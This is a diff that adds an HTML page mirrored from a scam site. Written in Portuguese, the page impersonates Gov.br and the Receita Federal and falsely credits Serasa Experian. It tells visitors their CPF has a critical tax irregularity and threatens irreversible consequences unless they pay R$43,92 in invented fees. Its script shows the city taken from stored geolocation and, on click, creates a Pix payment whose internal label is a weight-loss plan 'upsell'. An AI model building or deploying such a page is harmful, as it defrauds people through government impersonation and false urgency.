@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+
+<!-- Mirrored from certofsrs.com/upsells/01/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Jun 2025 13:56:56 GMT -->
+<head>
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Irregularidade no CPF - Gov.br</title>
+    
+    <link href="css/F4JtikZbH5CQ.css" rel="stylesheet">
+
+    <script src="https://cdn.tailwindcss.com/"></script>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-10927543007"></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+  
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+  
+        gtag('js', new Date());
+
+        gtag('config', 'AW-10927543007');
+    </script>
+
+    <style>
+        body {
+            background: linear-gradient(135deg, #dde1e7, #ffffff);
+        }
+
+        .card {
+
+            box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #D72B80, #e6559d);
+        }
+
+        .alert-warning {
+            background: #fff3cd;
+            border-left: 5px solid #ffae42;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #D72B80, #e6559d);
+            border: none;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #D72B80, #e6559d);
+            transform: scale(1.05);
+        }
+
+        .pulse-button {
+
+            display: inline-block;
+            padding: 10px 20px;
+            color: #fff;
+            background-color: #3498db;
+            border: none;
+            cursor: pointer;
+
+            /* Apply the pulse animation */
+            animation: pulse 2.5s infinite;
+        }
+
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-light">
+    <!--<noscript>-->
+    <!--    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5F9LTWL9" height="0" width="0" style="display: none; visibility: hidden;"></iframe>-->
+    <!--</noscript>-->
+
+    <div class="card shadow-lg border-0" style="max-width: 500px; width: 100%;">
+        <div class=" flex justify-center card-header text-white items-center py-3" style="border-radius: 0px 0px 10px 10px;">
+            <img src="images/k84hi0ld2F8m.png" alt="Governo Digital" class="img-fluid" style="width: 35%;">
+        </div>
+
+        <div class="card-body text-center">
+            <h4 class="text-danger fw-bold text-center text-lg mb-3">CPF IRREGULAR NA RECEITA FEDERAL</h4>
+
+            <p class="text-center text-gray-700 mb-4">Identificamos uma pendência fiscal crítica vinculada ao seu CPF nos registros da Receita Federal.</p>
+
+            <p class="text-center text-gray-800 mt-6">Caso a regularização não seja concluída imediatamente, o impacto será <span class="text-red-600 font-bold">irreversível</span>.</p>
+
+            <div class="alert alert-warning mt-3">
+                <i class="fas fa-map-marker-alt me-2"></i> Pendência localizada: <b id="location">sua região - </b>
+            </div>
+
+            <h5 class="mt-4 mb-2">Detalhamento das taxas</h5>
+            
+            <ul class="list-group text-start mb-3">
+                <li class="list-group-item d-flex justify-content-between">Taxa administrativa <span>R$29,24</span></li>
+                
+                <li class="list-group-item d-flex justify-content-between">Taxa de regularização <span>R$7,53</span></li>
+                
+                <li class="list-group-item d-flex justify-content-between">Multa por atraso <span>R$2,73</span></li>
+                
+                <li class="list-group-item d-flex justify-content-between">Taxa de processamento <span>R$4,42</span></li>
+                
+                <li class="list-group-item d-flex justify-content-between fw-bold bg-light">Total <span>R$43,92</span></li>
+            </ul>
+
+            <a href="#" class="btn pulse-button btn-primary btn-lg w-100 mt-4 fw-bold next-page">REGULARIZAR AGORA</a>
+        </div>
+
+        <div class="card-footer text-center text-muted py-3" style="margin-top: 10%;">© 2025 Serasa Experian - Todos os direitos reservados</div>
+    </div>
+
+    <script src="js/Wa1zRXwUAB4l.js"></script>
+
+    <script>
+        const geolocation = JSON.parse((localStorage.getItem('geolocation') || '{}'));
+
+        document.getElementById('location').textContent = geolocation.city + ' - ' + geolocation.region;
+
+        document.querySelector('a.next-page').addEventListener('click', (event) => {
+            event.preventDefault();
+            
+            const params = new URLSearchParams(window.location.search);
+
+            const utm_source   = params.get('utm_source')   || '';
+            const utm_medium   = params.get('utm_medium')   || '';
+            const utm_content  = params.get('utm_content')  || '';
+            const utm_campaign = params.get('utm_campaign') || '';
+            
+            $.ajax({
+                type: 'POST',
+                url: '../../gateway/transaction.php',
+                data: JSON.stringify({
+                    amount: 4392,
+                    paymentMethod: 'pix',
+                    items: [
+                        {
+                            'quantity': 1,
+                            'unitPrice': 4392,
+                            'title': 'Upsell 01 - Plano de emagrecimento',
+                            'tangible': false,
+                            'externalRef': '000000001'
+                        }
+                    ],
+                    customer: {
+                        id: localStorage.getItem('customerId')
+                    },
+                    metadata: {
+                		'utm_source': utm_source,
+                		'utm_medium': utm_medium,
+                		'utm_content': utm_content,
+                		'utm_campaign': utm_campaign
+                	}
+                }),
+                dataType: 'json',
+                success: (response) => {
+                    localStorage.setItem('transactionIdUpsell01', response.id);
+
+                    localStorage.setItem('qrcodeUpsell01', response.pix?.qrcode);
+
+                    window.location.href = '../../checkout/upsells/01' + window.location.search;
+                },
+                error: function (xhr, status, error) {
+                    alert(status);
+                    
+                    console.error('❌ Error checking transaction status:', error);
+                }
+            });
+        });
+    </script>
+</body>
+
+
+<!-- Mirrored from certofsrs.com/upsells/01/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Jun 2025 13:56:59 GMT -->
+</html>
